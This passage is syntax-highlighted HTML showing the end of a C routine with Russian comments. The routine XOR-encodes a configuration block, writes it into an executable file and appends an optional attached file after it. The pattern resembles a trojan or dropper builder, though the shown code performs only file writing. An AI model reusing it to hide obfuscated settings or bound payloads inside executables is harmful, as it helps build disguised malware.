</span><span class="sc0">    </span><span class="sc5">for</span><span class="sc10">(</span><span class="sc11">k</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc11">k</span><span class="sc10">&lt;</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">ConfigFormat</span><span class="sc10">);</span><span class="sc11">k</span><span class="sc10">++)</span><span class="sc0"> </span><span class="sc11">uk</span><span class="sc10">[</span><span class="sc11">k</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">^=</span><span class="sc0"> </span><span class="sc4">0x80</span><span class="sc10">;</span><span class="sc0"> 


    </span><span class="sc11">fwrite</span><span class="sc10">(&amp;</span><span class="sc11">config</span><span class="sc10">,</span><span class="sc4">1</span><span class="sc10">,</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">config</span><span class="sc10">),</span><span class="sc11">h_f</span><span class="sc10">);</span><span class="sc0">
    
    </span><span class="sc2">// Нам опять нужны незакриптованные настройки
</span><span class="sc0">    </span><span class="sc5">for</span><span class="sc10">(</span><span class="sc11">k</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc11">k</span><span class="sc10">&lt;</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">ConfigFormat</span><span class="sc10">);</span><span class="sc11">k</span><span class="sc10">++)</span><span class="sc0"> </span><span class="sc11">uk</span><span class="sc10">[</span><span class="sc11">k</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">^=</span><span class="sc0"> </span><span class="sc4">0x80</span><span class="sc10">;</span><span class="sc0"> 
    
    </span><span class="sc2">//Если приписан Файл
</span><span class="sc0">    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">config</span><span class="sc10">.</span><span class="sc11">attach</span><span class="sc10">){</span><span class="sc0">
    
      </span><span class="sc2">// Позиционируем после конфига
</span><span class="sc0">        </span><span class="sc11">fseek</span><span class="sc10">(</span><span class="sc11">h_f</span><span class="sc10">,</span><span class="sc11">j</span><span class="sc10">,</span><span class="sc11">SEEK_SET</span><span class="sc10">);</span><span class="sc0">
        
        </span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"Writing attached file at: %d"</span><span class="sc10">,</span><span class="sc11">j</span><span class="sc10">);</span><span class="sc0">
       
    </span><span class="sc5">while</span><span class="sc10">(!</span><span class="sc11">feof</span><span class="sc10">(</span><span class="sc11">h_f1</span><span class="sc10">)){</span><span class="sc0">
         </span><span class="sc11">dot</span><span class="sc10">=</span><span class="sc11">fgetc</span><span class="sc10">(</span><span class="sc11">h_f1</span><span class="sc10">);</span><span class="sc0">
         </span><span class="sc11">fputc</span><span class="sc10">(</span><span class="sc11">dot</span><span class="sc10">,</span><span class="sc11">h_f</span><span class="sc10">);</span><span class="sc0">
           </span><span class="sc10">}</span><span class="sc0">

    </span><span class="sc10">}</span><span class="sc0">
    
    </span><span class="sc11">fclose</span><span class="sc10">(</span><span class="sc11">h_f</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"Data was loaded from %s\n"</span><span class="sc0">
           </span><span class="sc6">"Executable is %s\n"</span><span class="sc10">,</span><span class="sc0">
           </span><span class="sc11">ini</span><span class="sc10">,</span><span class="sc11">buf3</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">};</span></div></body>
</html>
